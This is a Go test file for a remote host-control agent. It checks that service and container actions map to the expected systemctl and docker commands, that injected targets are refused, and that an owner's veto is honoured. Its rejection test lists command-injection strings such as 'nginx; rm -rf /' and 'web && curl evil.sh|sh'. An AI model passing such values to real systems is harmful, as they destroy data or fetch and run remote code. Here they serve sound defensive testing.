package main

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/thehelvijs/Reeve/contracts"
)

// fakeRunner replaces the one function that touches the system, and records
// what would have been executed. No test in this file may run systemctl or
// docker for real: a suite that can reboot the machine running it is not a
// suite anyone can run.
func fakeRunner(t *testing.T, out string, err error) *[][]string {
	t.Helper()
	var seen [][]string
	old := runArgv
	runArgv = func(_ context.Context, argv []string) ([]byte, error) {
		seen = append(seen, argv)
		return []byte(out), err
	}
	t.Cleanup(func() { runArgv = old })
	return &seen
}

func TestArgvForEveryAction(t *testing.T) {
	cases := map[string]struct {
		action, target string
		want           string
	}{
		"reboot":            {contracts.ActionReboot, "", "systemctl reboot"},
		"poweroff":          {contracts.ActionPoweroff, "", "systemctl poweroff"},
		"service start":     {contracts.ActionServiceStart, "nginx.service", "systemctl start nginx.service"},
		"service stop":      {contracts.ActionServiceStop, "nginx.service", "systemctl stop nginx.service"},
		"service restart":   {contracts.ActionServiceRestart, "nginx.service", "systemctl restart nginx.service"},
		"container start":   {contracts.ActionContainerStart, "web", "docker start web"},
		"container stop":    {contracts.ActionContainerStop, "web", "docker stop web"},
		"container restart": {contracts.ActionContainerRestart, "web", "docker restart web"},
	}
	for name, tc := range cases {
		argv, err := argvFor(tc.action, tc.target)
		if err != nil {
			t.Errorf("%s: %v", name, err)
			continue
		}
		if got := strings.Join(argv, " "); got != tc.want {
			t.Errorf("%s: argv = %q, want %q", name, got, tc.want)
		}
	}
	// Every action the contract permits must map to an argv, or the server can
	// queue something this agent silently cannot run.
	for action, kind := range contracts.CommandActions {
		target := ""
		if kind != contracts.TargetNone {
			target = "x"
		}
		if _, err := argvFor(action, target); err != nil {
			t.Errorf("contract permits %q but the agent has no argv for it: %v", action, err)
		}
	}
}

// The server validates targets too. This is the second check, and it is the one
// that holds if the server is lying.
func TestArgvForRefusesADangerousTarget(t *testing.T) {
	bad := []string{
		"", "nginx; rm -rf /", "../../etc/passwd", "web && curl evil.sh|sh",
		"a b", "$(whoami)", "`id`", "web\nnginx", "unit|other", strings.Repeat("a", 129),
	}
	for _, target := range bad {
		if _, err := argvFor(contracts.ActionServiceRestart, target); err == nil {
			t.Errorf("target %q was accepted", target)
		}
	}
	// Real unit and container names must still pass.
	for _, target := range []string{"nginx.service", "docker.service", "user@1000.service", "my-app_1", "web"} {
		if _, err := argvFor(contracts.ActionServiceRestart, target); err != nil {
			t.Errorf("legitimate target %q was refused: %v", target, err)
		}
	}
}

func TestArgvForRejectsAnUnknownAction(t *testing.T) {
	for _, action := range []string{"", "rm", "exec", "run_script", "REBOOT"} {
		if _, err := argvFor(action, "x"); err == nil {
			t.Errorf("action %q was accepted", action)
		}
	}
}

// The machine's owner outranks the server: with control off, nothing runs and
// nothing is reported.
func TestControllerVetoRunsNothing(t *testing.T) {
	c := newController(false)
	c.handle([]contracts.Command{{ID: "1", Action: contracts.ActionServiceRestart, Target: "nginx.service"}},
		func(contracts.CommandResult) { t.Error("a vetoed agent reported a power result") })
	if got := c.takeResults(); len(got) != 0 {
		t.Errorf("results = %+v, want none", got)
	}
}

func TestControllerRunsAndReportsFailure(t *testing.T) {
	seen := fakeRunner(t, "Unit not found.", errors.New("exit status 5"))
	c := newController(true)
	c.handle([]contracts.Command{{ID: "cmd-1", Action: contracts.ActionServiceRestart, Target: "canary.service"}}, nil)

	if len(*seen) != 1 || strings.Join((*seen)[0], " ") != "systemctl restart canary.service" {
		t.Fatalf("executed %v, want one systemctl restart canary.service", *seen)
	}
	got := c.takeResults()
	if len(got) != 1 {
		t.Fatalf("results = %+v, want exactly one", got)
	}
	if got[0].ID != "cmd-1" {
		t.Errorf("result id = %q, want cmd-1", got[0].ID)
	}
	if got[0].OK {
		t.Error("a non-zero exit reported success")
	}
	if got[0].Output != "Unit not found." {
		t.Errorf("output = %q, want the command's own output", got[0].Output)
	}
	if got[0].FinishedAt.IsZero() {
		t.Error("result carries no finish time")
	}
}

func TestControllerRunsAndReportsSuccess(t *testing.T) {
	seen := fakeRunner(t, "", nil)
	c := newController(true)
	c.handle([]contracts.Command{{ID: "ok-1", Action: contracts.ActionContainerRestart, Target: "web"}}, nil)

	if len(*seen) != 1 || strings.Join((*seen)[0], " ") != "docker restart web" {
		t.Fatalf("executed %v, want one docker restart web", *seen)
	}
	got := c.takeResults()
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("results = %+v, want one success", got)
	}
}

func TestControllerTruncatesLongOutput(t *testing.T) {
	fakeRunner(t, strings.Repeat("x", contracts.MaxCommandOutput+500), nil)
	c := newController(true)
	c.handle([]contracts.Command{{ID: "big", Action: contracts.ActionServiceStart, Target: "canary.service"}}, nil)
	got := c.takeResults()
	if len(got) != 1 || len(got[0].Output) != contracts.MaxCommandOutput {
		t.Errorf("output length = %d, want the %d cap", len(got[0].Output), contracts.MaxCommandOutput)
	}
}

// A malformed command must produce a failed result, not silence: an operator
// watching the UI has to see that it was refused.
func TestControllerReportsRefusedTarget(t *testing.T) {
	c := newController(true)
	c.handle([]contracts.Command{{ID: "bad", Action: contracts.ActionServiceRestart, Target: "nginx; rm -rf /"}}, nil)
	got := c.takeResults()
	if len(got) != 1 || got[0].OK {
		t.Fatalf("results = %+v, want one failure", got)
	}
	if !strings.Contains(got[0].Output, "refusing target") {
		t.Errorf("output = %q, want it to say the target was refused", got[0].Output)
	}
}

// Rebooting kills the agent, so the result goes out before the action runs.
// The runner is faked: this must never actually power off the test machine.
func TestPowerActionReportsBeforeItRuns(t *testing.T) {
	var order []string
	old := runArgv
	runArgv = func(_ context.Context, argv []string) ([]byte, error) {
		order = append(order, "ran "+strings.Join(argv, " "))
		return nil, nil
	}
	t.Cleanup(func() { runArgv = old })

	c := newController(true)
	var reported []contracts.CommandResult
	c.run(contracts.Command{ID: "pw", Action: contracts.ActionPoweroff}, func(r contracts.CommandResult) {
		order = append(order, "reported")
		reported = append(reported, r)
	})

	if len(order) != 2 || order[0] != "reported" || order[1] != "ran systemctl poweroff" {
		t.Fatalf("order = %v, want the result reported before poweroff is invoked", order)
	}
	if len(reported) != 1 || reported[0].ID != "pw" || !reported[0].OK {
		t.Errorf("pre-run report = %+v, want an ok result for pw", reported)
	}
	// It is not also queued for the next push, or the server would see it twice.
	if got := c.takeResults(); len(got) != 0 {
		t.Errorf("power result was also queued: %+v", got)
	}
}

func TestControllerCapsBufferedResults(t *testing.T) {
	c := newController(true)
	for i := 0; i < contracts.MaxPushCommandResults+5; i++ {
		c.addResult(contracts.CommandResult{ID: "x"})
	}
	if got := len(c.takeResults()); got != contracts.MaxPushCommandResults {
		t.Errorf("buffered %d results, want the cap of %d", got, contracts.MaxPushCommandResults)
	}
}

func TestControlDefaultsOn(t *testing.T) {
	t.Setenv("REEVE_SERVER_URL", "http://x")
	t.Setenv("REEVE_AGENT_TOKEN", "t")
	cfg, err := loadConfig()
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.AllowControl {
		t.Error("control must be on unless the host opts out")
	}
	t.Setenv("REEVE_ALLOW_CONTROL", "false")
	cfg, _ = loadConfig()
	if cfg.AllowControl {
		t.Error("REEVE_ALLOW_CONTROL=false must turn control off")
	}
}
